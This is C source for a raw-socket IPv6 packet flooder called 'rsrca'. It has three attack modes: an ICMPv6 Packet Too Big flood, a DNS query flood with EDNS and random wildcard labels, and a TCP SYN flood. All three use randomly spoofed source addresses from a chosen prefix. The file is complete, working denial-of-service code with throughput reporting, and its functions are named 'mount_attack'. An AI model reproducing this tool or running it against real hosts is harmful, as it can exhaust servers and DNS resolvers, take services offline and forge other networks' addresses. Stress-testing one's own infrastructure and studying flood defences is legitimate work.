#include <stdio.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include <signal.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <getopt.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/prctl.h>
#include <netinet/ip6.h>
#include <netinet/icmp6.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <time.h>

#include "rnd_cpp.h"
#include "inetchksm.h"
#include "dns-utils.h"

#define ARGV0 "rsrca"
#define CACHE_SIZE 8192

#define IS_NB_ERR(expr) ((expr) == EAGAIN || (expr) == EWOULDBLOCK)


static struct {
	struct {
		int sck;
	} fd;
	struct {
		char str_addr[INET6_ADDRSTRLEN + sizeof("%4294967295") - 1];
	} dst;
	struct {
		struct timespec ts_last_report;
		uint64_t last_it_cnt;
	} bm;
	struct {
		uint64_t cache[CACHE_SIZE];
		size_t cur_c;
		int pipe[2];
		pid_t pid;
	} rnd;
	struct {
		struct {
			uint8_t m[256];
			size_t len;
		} rname;
	} dns;
	struct {
		volatile bool report_due;
	} flags;
} gctx;

static struct {
	struct {
		uint8_t addr[16];
		uint8_t mask[16];
		uint8_t len;
	} src_net;
	struct {
		const char *str;
		struct sockaddr_in6 sa;
	} dst;
	struct {
		bool dryrun;
		bool quiet;
		bool help;
		bool wildcard;
	} flags;
	int v;
	const char *mode;
	struct {
		const char *rname;
		uint16_t rtype;
	} dns;
	unsigned int report_interval;
	uint16_t dst_port;
	uint64_t count;
} param;


static void init_dns_txt_labels (const char *rname) {
	gctx.dns.rname.len = dns_labelize(rname, gctx.dns.rname.m, sizeof(gctx.dns.rname.m));

	if (gctx.dns.rname.len == 0) {
		perror(rname);
		abort();
	}
}

static bool rnd_do_seed (void *ctx, const int fd) {
	const size_t seed_size = rnd_cpp_seed_size(ctx);
	uint8_t seed[seed_size];
	ssize_t iofr;

	iofr = read(fd, seed, seed_size);
	if (iofr < 0) {
		perror(ARGV0": seedrnd()");
		return false;
	}
	assert(iofr == (ssize_t)seed_size);

	rnd_cpp_seed(ctx, seed);

	return true;
}

static bool rnd_init (void *ctx) {
	static const rnd_cpp_t rct = RNDCPPTYPE_MT19937;
	int fd = -1;
	bool ret;

	if (!rnd_cpp_setopt(ctx, &rct)) {
		perror(ARGV0": rnd_cpp_setopt()");
		return false;
	}

	fd = open("/dev/urandom", O_RDONLY);
	if (fd < 0) {
		perror(ARGV0": /dev/urandom");
		return false;
	}

	ret = rnd_do_seed(ctx, fd);
	close(fd);

	return ret;
}

static void rnd_main (void) {
	const size_t ctx_size = rnd_cpp_ctx_size();
	uint8_t ctx[ctx_size];

	prctl(PR_SET_NAME, ARGV0"_c-rnd");

	memset(ctx, 0, ctx_size);
	if (!rnd_init(ctx)) {
		return;
	}

	while (true) {
		rnd_cpp(ctx, (uint8_t*)gctx.rnd.cache, sizeof(gctx.rnd.cache));
		write(gctx.rnd.pipe[1], gctx.rnd.cache, sizeof(gctx.rnd.cache));
	}
}

static void init_params (void) {
	param.dns.rtype = 16; // TXT
	param.count = UINT64_MAX;
	param.report_interval = 1;
}

static void init_global (void) {
	gctx.fd.sck = -1;
	gctx.rnd.cur_c = SIZE_MAX;

	gctx.rnd.pid = -1;
	gctx.rnd.pipe[0] = -1;
	gctx.rnd.pipe[1] = -1;
}

static void free_global (void) {
	close(gctx.fd.sck);
	close(gctx.rnd.pipe[0]);
	close(gctx.rnd.pipe[1]);
}

static bool alloc_globals (void) {
	int fr;

	fr = pipe(gctx.rnd.pipe);
	if (fr == 0) {
		int pipe_size = sizeof(gctx.rnd.cache);

		fcntl(gctx.rnd.pipe[0], F_SETPIPE_SZ, pipe_size);
		fcntl(gctx.rnd.pipe[1], F_SETPIPE_SZ, pipe_size);
	}
	else {
		perror(ARGV0": pipe()");
		return false;
	}

	gctx.rnd.pid = fork();
	if (gctx.rnd.pid < 0) {
		perror(ARGV0": fork()");
		return false;
	}
	else if (gctx.rnd.pid == 0) {
		close(gctx.rnd.pipe[0]);
		gctx.rnd.pipe[0] = -1;

		rnd_main();
		abort();
	}
	else {
		close(gctx.rnd.pipe[1]);
		gctx.rnd.pipe[1] = -1;
	}

	if (!param.flags.dryrun) {
		gctx.fd.sck = socket(AF_INET6, SOCK_RAW, IPPROTO_RAW);
		if (gctx.fd.sck < 0) {
			fprintf(stderr, ARGV0": ");
			perror("socket()");
			return false;
		}
	}

	clock_gettime(CLOCK_MONOTONIC, &gctx.bm.ts_last_report);

	return true;
}

static void flush_rnd (void) {
	ssize_t iofr;

	iofr = read(gctx.rnd.pipe[0], gctx.rnd.cache, sizeof(gctx.rnd.cache));
	if (iofr != sizeof(gctx.rnd.cache)) {
		fprintf(stderr, ARGV0": rnd child died\n");
		abort();
	}

	gctx.rnd.cur_c = 0;
}

static uint64_t pull_rnd (void) {
	if (gctx.rnd.cur_c >= CACHE_SIZE) {
		flush_rnd();
	}

	return gctx.rnd.cache[gctx.rnd.cur_c++];
}

static void genrnd (size_t len, void *out) {
	uint8_t *buf = (uint8_t*)out;
	uint64_t n;
	size_t consume;

	if ((uintptr_t)out % sizeof(uint64_t) == 0) { // aligned
		while (len >= sizeof(uint64_t) * 2) {
			*((uint64_t*)buf) = pull_rnd();
			*((uint64_t*)buf + 1) = pull_rnd();
			len -= sizeof(uint64_t) * 2;
			buf += sizeof(uint64_t) * 2;
		}
		while (len >= sizeof(uint64_t)) {
			*((uint64_t*)buf) = pull_rnd();
			len -= sizeof(uint64_t);
			buf += sizeof(uint64_t);
		}
	}

	while (len > 0) {
		n = pull_rnd();
		consume = len > sizeof(n) ? sizeof(n) : len;
		memcpy(buf, &n, consume);
		len -= consume;
		buf += consume;
	}
}

static void print_help (FILE *f) {
	fprintf(f,
"Usage: %s [-hdq] [--help] [--dryrun] [--quiet] [-p|--dst-port PORT] [-I|--report INT]\n"
"       [-c|--count COUNT] [-T|--rtype RTYPE] [-R|--rname RNAME] [-w|--wildcard]\n"
"       <--mode|-m MODE> [--] SRC_NET DST_ADDR\n"\
"MODE:        'ptb_flood_icmp6_echo' | 'dns_flood' | 'syn_flood'\n"
"SRC_NET:     2001:db8:1:2::/64\n"
"DST_ADDR:    any string accepted by getaddrinfo()\n"
"Options:\n"
"  -m, --mode MODE      run in specified mode\n"
"  -c, --count COUNT    number of iterations\n"
"  -p, --dst-port PORT  override destination port\n"
"  -R, --rname RNAME    QNAME to use in queries\n"
"  -T, --rtype RTYPE    numeric QTYPE to use in queries (default: 16 (TXT))\n"
"  -w, --wildcard       prepend random label\n"
"  -I, --report INT     report interval in seconds (default: 1)\n"
"  -d, --dryrun         run in dry mode (don't actually send anything)\n"
"  -v, --verbose        increase verbosity\n"
"  -q, --quiet          report errors only\n"
"  -h, --help           print this message and exit normally\n"
		,
		ARGV0);
};

static void lock_ouput (void) {}
static void unlock_ouput (void) {}

bool sendto_masked_error (const int e) {
	switch (e) {
#if EAGAIN == EWOULDBLOCK
	case EAGAIN:
#else
	case EAGAIN:
	case EWOULDBLOCK:
#endif
		return false;
	}

	return true;
}

static void report_sent (const void *addr, const int err) {
	static char str_addr[INET6_ADDRSTRLEN];

	if (sendto_masked_error(err)) {
		return;
	}

	inet_ntop(AF_INET6, addr, str_addr, sizeof(str_addr));

	lock_ouput(); {
		printf(
			"{ \"what\": \"sendto\", \"msg\": { \"pid\": %d, \"from\": \"%s\", \"to\": \"%s\", \"error\": %d } }\n"
			,
			(int)getpid(),
			str_addr,
			gctx.dst.str_addr,
			err
		);
	}
	unlock_ouput();
}

static void genrnd_src_addr (void *out) {
	const size_t p_Blen = param.src_net.len / 8;
	uint8_t *o = (uint8_t*)out;
	uint8_t m;

	genrnd(16 - p_Blen, o + p_Blen);

	for (size_t i = 0; i < 16; i += 1) {
		m = param.src_net.mask[i];
		o[i] = (param.src_net.addr[i] & m) | (o[i] & ~m);
	}
}

static void ts_sub (
		struct timespec *out,
		const struct timespec *a,
		const struct timespec *b)
{
	if (a->tv_nsec < b->tv_nsec) {
		out->tv_sec = a->tv_sec - 1 - b->tv_sec;
		out->tv_nsec = 1000000000 + a->tv_nsec - b->tv_nsec;
	}
	else {
		out->tv_sec = a->tv_sec - b->tv_sec;
		out->tv_nsec = a->tv_nsec - b->tv_nsec;
	}
}

static void do_report_print (
		const uint64_t it_period,
		const struct timespec *ts_elapsed)
{
	lock_ouput(); {
		printf(
			"{ \"what\": \"throughput\", \"msg\": { \"pid\": %d, \"duration\": %ld.%03ld, \"count\": %zu } }\n"
			,
			(int)getpid(),
			(long)ts_elapsed->tv_sec,
			ts_elapsed->tv_nsec / 1000000,
			it_period
		);
	}
	unlock_ouput();
}

static void do_report (const uint64_t cur_it) {
	struct timespec ts_now, ts_elapsed;

	if (!gctx.flags.report_due) {
		return;
	}

	clock_gettime(CLOCK_MONOTONIC, &ts_now);
	ts_sub(&ts_elapsed, &ts_now, &gctx.bm.ts_last_report);

	do_report_print(cur_it - gctx.bm.last_it_cnt, &ts_elapsed);

	gctx.bm.ts_last_report = ts_now;
	gctx.bm.last_it_cnt = cur_it;
	gctx.flags.report_due = false;
}

static void mount_attack_icmp6_ptb (void) {
	struct {
		struct ip6_hdr ih6;
		struct icmp6_hdr icmp6;
		struct {
			struct ip6_hdr ih6;
			struct icmp6_hdr icmp6;
		} body;
	} snd_buf = { 0, };
	ssize_t fr;

	memcpy(&snd_buf.ih6.ip6_dst, &param.dst.sa.sin6_addr, 16);
	snd_buf.ih6.ip6_ctlun.ip6_un2_vfc = 6 << 4;
	snd_buf.ih6.ip6_ctlun.ip6_un1.ip6_un1_hlim = 128;
	snd_buf.ih6.ip6_ctlun.ip6_un1.ip6_un1_nxt = IPPROTO_ICMPV6;
	snd_buf.ih6.ip6_ctlun.ip6_un1.ip6_un1_plen = htons(sizeof(snd_buf) - sizeof(struct ip6_hdr));
	snd_buf.icmp6.icmp6_type = ICMP6_PACKET_TOO_BIG;
	snd_buf.icmp6.icmp6_dataun.icmp6_un_data32[0] = htonl(1280);

	snd_buf.body.ih6.ip6_ctlun.ip6_un2_vfc = 6 << 4;
	snd_buf.body.ih6.ip6_ctlun.ip6_un1.ip6_un1_hlim = 128;
	snd_buf.body.ih6.ip6_ctlun.ip6_un1.ip6_un1_nxt = IPPROTO_ICMPV6;
	snd_buf.body.ih6.ip6_ctlun.ip6_un1.ip6_un1_plen = htons(sizeof(struct icmp6_hdr));
	memcpy(&snd_buf.body.ih6.ip6_src, &snd_buf.ih6.ip6_dst, 16);
	snd_buf.body.icmp6.icmp6_type = ICMP6_ECHO_REPLY;
	genrnd(sizeof(uint32_t), snd_buf.body.icmp6.icmp6_dataun.icmp6_un_data8);

	for (uint64_t it = 0; it < param.count ; it += 1) {
		genrnd_src_addr(&snd_buf.ih6.ip6_src);
		memcpy(&snd_buf.body.ih6.ip6_dst, &snd_buf.ih6.ip6_src, 16);

		snd_buf.body.icmp6.icmp6_cksum = 0;
		snd_buf.body.icmp6.icmp6_cksum = htons(calc_chksum6(
			&snd_buf.body.ih6,
			&snd_buf.body.icmp6,
			sizeof(struct icmp6_hdr),
			NULL,
			0
		));

		snd_buf.icmp6.icmp6_cksum = 0;
		snd_buf.icmp6.icmp6_cksum = htons(calc_chksum6(
			&snd_buf.ih6,
			&snd_buf.icmp6,
			sizeof(snd_buf) - sizeof(struct ip6_hdr),
			NULL,
			0
		));

		errno = 0;
		fr = param.flags.dryrun ? 0 : sendto(
			gctx.fd.sck,
			&snd_buf,
			sizeof(snd_buf),
			MSG_NOSIGNAL | MSG_DONTWAIT,
			(const struct sockaddr*)&param.dst.sa,
			sizeof(struct sockaddr_in6));

		if (fr < 0 || (!param.flags.quiet && param.v > 0)) {
			report_sent(&snd_buf.ih6.ip6_src, errno);
		}
		if (!param.flags.quiet) {
			do_report(it);
		}
	}
}

static int main_ptb_flood_icmp6_echo (void) {
	// TODO: parallelise?
	mount_attack_icmp6_ptb();
	return 0;
}

static void get_rnd_qname (char *out) {
	const uint64_t n = pull_rnd();
	const int fr = snprintf(
		out,
		256,
		"%"PRIu64"%s%s",
		n,
		param.dns.rname[0] == '.' ? "" : ".",
		param.dns.rname);

	(void)fr;

	assert(0 < fr && fr < 256);
}

static void mount_attack_dns_flood (void) {
	struct {
		struct ip6_hdr ih6;
		struct udphdr udp;
		uint8_t data[512];
	} snd_buf = { 0, };
	ssize_t fr;
	uint16_t data_len;

	for (uint64_t it = 0; it < param.count; it += 1) {
		if (param.flags.wildcard) {
			static char m[256];

			get_rnd_qname(m);
			init_dns_txt_labels(m);
		}

		data_len = (uint16_t)gctx.dns.rname.len + 27; // QNAME

		memcpy(&snd_buf.ih6.ip6_dst, &param.dst.sa.sin6_addr, 16);
		snd_buf.ih6.ip6_ctlun.ip6_un2_vfc = 6 << 4;
		snd_buf.ih6.ip6_ctlun.ip6_un1.ip6_un1_hlim = 128;
		snd_buf.ih6.ip6_ctlun.ip6_un1.ip6_un1_nxt = IPPROTO_UDP;
		snd_buf.ih6.ip6_ctlun.ip6_un1.ip6_un1_plen = htons(
			(uint16_t)sizeof(struct udphdr) +
			data_len
		);
		snd_buf.udp.uh_dport = htons(param.dst_port);
		snd_buf.udp.uh_ulen = htons((uint16_t)sizeof(struct udphdr) + data_len);

		// QR: 0, Opcode: 0, AA:0, TC: 0, RD: 1, RA: 0, Z: 0, RCODE: 0
		snd_buf.data[2] = 0x01;
		snd_buf.data[3] = 0x00;
		// QDCOUNT: 1
		snd_buf.data[4] = 0x00;
		snd_buf.data[5] = 0x01;
		// ANCOUNT, NSCOUNT
		snd_buf.data[6] = snd_buf.data[7] = snd_buf.data[8] = snd_buf.data[9] = 0x00;
		// ARCOUNT: 1
		snd_buf.data[10] = 0x00;
		snd_buf.data[11] = 0x01;

		memcpy(snd_buf.data + 12, gctx.dns.rname.m, gctx.dns.rname.len);
		// QTYPE
		snd_buf.data[gctx.dns.rname.len + 12] = (uint8_t)((param.dns.rtype & 0xff00) >> 8);
		snd_buf.data[gctx.dns.rname.len + 13] = (uint8_t)(param.dns.rtype & 0x00ff);
		// QCLASS: IN
		snd_buf.data[gctx.dns.rname.len + 14] = 0x00;
		snd_buf.data[gctx.dns.rname.len + 15] = 0x01;

		// NAME: ROOT
		snd_buf.data[gctx.dns.rname.len + 16] = 0x00;
		// OPT
		snd_buf.data[gctx.dns.rname.len + 17] = 0x00;
		snd_buf.data[gctx.dns.rname.len + 18] = 0x29;
		// UDP payload size: 1298
		snd_buf.data[gctx.dns.rname.len + 19] = 0x05;
		snd_buf.data[gctx.dns.rname.len + 20] = 0x12;

		snd_buf.data[gctx.dns.rname.len + 21] = 0x00;
		snd_buf.data[gctx.dns.rname.len + 22] = 0x00;

		snd_buf.data[gctx.dns.rname.len + 23] = 0x00;
		snd_buf.data[gctx.dns.rname.len + 24] = 0x00;
		// Data length: 0
		snd_buf.data[gctx.dns.rname.len + 25] = 0x00;
		snd_buf.data[gctx.dns.rname.len + 26] = 0x00;

		genrnd_src_addr(&snd_buf.ih6.ip6_src);

		// ID
		genrnd(2, snd_buf.data);
		snd_buf.data[1] |= 1; // as 0 is reserved

		genrnd(2, &snd_buf.udp.uh_sport);
		snd_buf.udp.uh_sport = htons((snd_buf.udp.uh_sport % 59975) + 1025);
		snd_buf.udp.uh_sum = 0;
		snd_buf.udp.uh_sum = htons(calc_chksum6_udp(
			&snd_buf.ih6,
			&snd_buf.udp,
			sizeof(snd_buf.udp),
			snd_buf.data,
			data_len
		));

		errno = 0;
		fr = param.flags.dryrun ? 0 : sendto(
			gctx.fd.sck,
			&snd_buf,
			sizeof(struct ip6_hdr) + sizeof(struct udphdr) + data_len,
			MSG_NOSIGNAL | MSG_DONTWAIT,
			(const struct sockaddr*)&param.dst.sa,
			sizeof(struct sockaddr_in6));

		if (!IS_NB_ERR(errno) && (fr < 0 || (!param.flags.quiet && param.v > 0))) {
			report_sent(&snd_buf.ih6.ip6_src, errno);
		}
		if (!param.flags.quiet) {
			do_report(it);
		}
	}
}

static int main_dns_flood (void) {
	init_dns_txt_labels(param.dns.rname);

	mount_attack_dns_flood();

	return 0;
}

static void mount_attack_syn_flood (void) {
	struct {
		struct ip6_hdr ih6;
		struct tcphdr tcp;
	} snd_buf = { 0, };
	ssize_t fr;

	memcpy(&snd_buf.ih6.ip6_dst, &param.dst.sa.sin6_addr, 16);
	snd_buf.ih6.ip6_ctlun.ip6_un2_vfc = 6 << 4;
	snd_buf.ih6.ip6_ctlun.ip6_un1.ip6_un1_hlim = 128;
	snd_buf.ih6.ip6_ctlun.ip6_un1.ip6_un1_nxt = IPPROTO_TCP;
	snd_buf.ih6.ip6_ctlun.ip6_un1.ip6_un1_plen = htons((uint16_t)sizeof(struct tcphdr));

	snd_buf.tcp.th_dport = htons(param.dst_port);
	snd_buf.tcp.th_off = sizeof(struct tcphdr) / 4;
	snd_buf.tcp.th_flags = TH_SYN;
	snd_buf.tcp.th_win = 0xffff;

	for (uint64_t it = 0; it < param.count; it += 1) {
		genrnd_src_addr(&snd_buf.ih6.ip6_src);

		genrnd(sizeof(snd_buf.tcp.th_seq), &snd_buf.tcp.th_seq);

		genrnd(2, &snd_buf.tcp.th_sport);
		snd_buf.tcp.th_sport = htons((snd_buf.tcp.th_sport % 59975) + 1025);
		snd_buf.tcp.th_sum = 0;
		snd_buf.tcp.th_sum = htons(calc_chksum6(
			&snd_buf.ih6,
			&snd_buf.tcp,
			sizeof(snd_buf.tcp),
			NULL,
			0
		));

		errno = 0;
		fr = param.flags.dryrun ? 0 : sendto(
			gctx.fd.sck,
			&snd_buf,
			sizeof(struct ip6_hdr) + sizeof(struct tcphdr),
			MSG_NOSIGNAL | MSG_DONTWAIT,
			(const struct sockaddr*)&param.dst.sa,
			sizeof(struct sockaddr_in6));

		if (fr < 0 || (!param.flags.quiet && param.v > 0)) {
			report_sent(&snd_buf.ih6.ip6_src, errno);
		}
		if (!param.flags.quiet) {
			do_report(it);
		}
	}
}

static int main_syn_flood (void) {
	mount_attack_syn_flood();

	return 0;
}

static void fill_prefix (uint8_t len, uint8_t *out) {
	const size_t cnt_bytes = len / 8;
	size_t i;

	for (i = 0; i < cnt_bytes; i += 1) {
		out[i] = 0xff;
	}
	len -= cnt_bytes * 8;
	out += i;
	for (i = 0; i < len; i += 1) {
		*out = (*out << 1) | 1;
	}
}

static bool parse_net_str (
		const char *in_str,
		void *addr,
		void *mask,
		uint8_t *len)
{
	char str[INET6_ADDRSTRLEN];
	char *slash;
	uint8_t ret_buf[16];
	uint8_t ret_mask[16] = { 0, };
	uint8_t ret_len = 0;
	int fr;

	strncpy(str, in_str, sizeof(str) - 1);
	slash = strchr(str, '/');
	if (slash != NULL) {
		*slash = 0;

		if (sscanf(slash + 1, "%"SCNu8, &ret_len) != 1 || ret_len > 128) {
			errno = EINVAL;
			return false;
		}
	}
	else {
		ret_len = 128;
	}

	fr = inet_pton(AF_INET6, str, ret_buf);
	if (fr == 0) {
		errno = EINVAL;
		return false;
	}
	else if (fr < 0) {
		return false;
	}
	fill_prefix(ret_len, ret_mask);

	memcpy(addr, ret_buf, 16);
	memcpy(mask, ret_mask, 16);
	*len = ret_len;
	return true;
}

static bool parse_param (const int argc, const char **argv) {
	static const struct option LOPTS[] = {
		{ "help",     false, NULL, 'h' },
		{ "dryrun",   false, NULL, 'd' },
		{ "quiet",    false, NULL, 'q' },
		{ "mode",     true,  NULL, 'm' },
		{ "verbose",  false, NULL, 'v' },
		{ "rname",    true,  NULL, 'R' },
		{ "rtype",    true,  NULL, 'T' },
		{ "dst-port", true,  NULL, 'p' },
		{ "count",    true,  NULL, 'c' },
		{ "wildcard", false, NULL, 'w' },
		{ "report",   true,  NULL, 'I' },
	};
	int loi = -1;
	int fr;
	bool fallthrough = false;

	while (true) {
		fr = getopt_long(argc, (char *const*)argv, "hdqm:vT:R:p:c:wI:", LOPTS, &loi);
		if (fr < 0) {
			break;
		}

		switch (fr) {
		case 'h': fallthrough = (param.flags.help = true); break;
		case 'd': param.flags.dryrun = true; break;
		case 'q': param.flags.quiet = true; break;
		case 'm': param.mode = optarg; break;
		case 'v': param.v += 1; break;
		case 'R': param.dns.rname = optarg; break;
		case 'T':
			if (sscanf(optarg, "%"SCNu16, &param.dns.rtype) != 1 ||
					param.dns.rtype == 0)
			{
				errno = EINVAL;
				fprintf(stderr, ARGV0": -T %s: ", optarg);
				perror(NULL);
				return false;
			}
			break;
		case 'p':
			if (sscanf(optarg, "%"SCNu16, &param.dst_port) != 1) {
				errno = EINVAL;
				fprintf(stderr, ARGV0": -p %s: ", optarg);
				perror(NULL);
				return false;
			}
			break;
		case 'c':
			if (sscanf(optarg, "%"SCNu64, &param.count) != 1 || param.count == 0) {
				errno = EINVAL;
				fprintf(stderr, ARGV0": -c %s: ", optarg);
				perror(NULL);
				return false;
			}
			break;
		case 'w':
			param.flags.wildcard = true;
			break;
		case 'I':
			sscanf(optarg, "%u", &param.report_interval);
			break;
		default: return false;
		}
	}

	if (fallthrough) {
		return true;
	}

	if (param.mode == NULL) {
		fprintf(stderr, ARGV0": missing option -m. Run with -h option for help\n");
		return false;
	}

	if (optind + 1 >= argc) {
		fprintf(stderr, ARGV0": too few arguments\n");
		return false;
	}

	if (param.flags.wildcard) {
		const size_t l = strlen(param.dns.rname);
		bool c;

		if (param.dns.rname[0] == '.') {
			c = l + 20 <= 255;
		}
		else {
			c = l + 21 <= 255;
		}

		if (!c) {
			fprintf(stderr, ARGV0": %s: ", param.dns.rname);
			errno = ENAMETOOLONG;
			perror(NULL);
			return false;
		}
	}

	fr = parse_net_str(
		argv[optind],
		param.src_net.addr,
		param.src_net.mask,
		&param.src_net.len
	);
	if (!fr) {
		fprintf(stderr, ARGV0": ");
		perror(argv[optind]);
		return false;
	}

	param.dst.str = argv[optind + 1];

	return true;
}

static bool resolve_dst (void) {
	static struct addrinfo hints = { 0, };
	int fr;
	struct addrinfo *ai = NULL;
	char addr_str[INET6_ADDRSTRLEN] = { 0, };

	hints.ai_family = AF_INET6;
	// hints.ai_socktype = SOCK_RAW;
	// hints.ai_protocol = IPPROTO_RAW;
	fr = getaddrinfo(param.dst.str, NULL, &hints, &ai);
	if (fr != 0) {
		return false;
	}

	// hostname resolve. copy the sa into our address space
	assert(sizeof(param.dst.sa) == ai->ai_addrlen);
	memcpy(&param.dst.sa, ai->ai_addr, sizeof(param.dst.sa));

	// cache the selected dst address string for reporting purposes
	inet_ntop(AF_INET6, &param.dst.sa.sin6_addr, addr_str, sizeof(addr_str));
	if (param.dst.sa.sin6_scope_id > 0) {
		snprintf(
			gctx.dst.str_addr,
			sizeof(gctx.dst.str_addr),
			"%s%%%"PRIu32
			,
			addr_str,
			param.dst.sa.sin6_scope_id
		);
	}
	else {
		strncpy(gctx.dst.str_addr, addr_str, sizeof(gctx.dst.str_addr) - 1);
	}

	freeaddrinfo(ai);
	return true;
}

static void handle_report_signal (int) {
	gctx.flags.report_due = true;
	if (param.report_interval > 0) {
		alarm(param.report_interval);
	}
}

static void install_signal (void) {
	struct sigaction sa = { 0, };

	sa.sa_handler = handle_report_signal;
	sa.sa_flags = SA_RESTART;
	sigaction(SIGALRM, &sa, NULL);

	if (param.report_interval > 0) {
		alarm(param.report_interval);
	}
}

int main (const int argc, const char **argv) {
	int ec = 0;

	init_params();
	init_global();

	if (!parse_param(argc, argv)) {
		ec = 2;
		goto END;
	}

	if (param.flags.help) {
		print_help(stdout);
		goto END;
	}

	if (!alloc_globals()) {
		ec = 1;
		goto END;
	}

	if (!resolve_dst()) {
		fprintf(stderr, ARGV0": ");
		perror(param.dst.str);
		ec = 1;
		goto END;
	}
	if (!param.flags.quiet) {
		fprintf(stderr, ARGV0": selected target: %s\n", gctx.dst.str_addr);
	}

	install_signal();

	if (strcmp(param.mode, "ptb_flood_icmp6_echo") == 0) {
		ec = main_ptb_flood_icmp6_echo();
	}
	else if (strcmp(param.mode, "dns_flood") == 0) {
		if (param.dns.rname == NULL) {
			fprintf(stderr, ARGV0": missing option -R. Run with -h option for help\n");
			ec = 2;
			goto END;
		}

		if (param.dst_port == 0) {
			param.dst_port = 53;
		}

		ec = main_dns_flood();
	}
	else if (strcmp(param.mode, "syn_flood") == 0) {
		if (param.dst_port == 0) {
			fprintf(stderr, ARGV0": missing option -p. Run with -h option for help\n");
			ec = 2;
			goto END;
		}

		ec = main_syn_flood();
	}
	else {
		fprintf(stderr, ARGV0": ");
		errno = EINVAL;
		perror(param.mode);
		ec = 2;
	}

END:
	free_global();
	return ec;
}
